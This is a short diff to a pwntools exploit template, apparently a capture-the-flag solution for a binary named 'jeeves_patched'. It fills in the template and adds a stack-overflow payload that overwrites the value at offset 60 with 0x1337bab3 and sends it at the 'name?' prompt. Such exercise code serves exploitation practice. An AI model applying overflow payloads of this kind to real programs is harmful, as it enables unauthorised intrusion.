@@ -2,11 +2,11 @@
 
 from pwn import *
 
-{bindings}
+e = ELF("./jeeves_patched")
 # libc = elf('./libc.so.6')
-# rop = ROP({bin_name})
+# rop = ROP(e)
 
-context.binary = {bin_name}
+context.binary = e
 context.terminal = ['tmux', 'split', '-h']
 
 
@@ -31,7 +31,10 @@ def conn():
 def main():
     r = conn()
 
-    # good luck pwning :)
+    payload = flat({
+        60: 0x1337bab3,
+        }, filler=b'\x90')
+    r.sendlineafter(b'name?', payload)
 
     r.interactive()
 
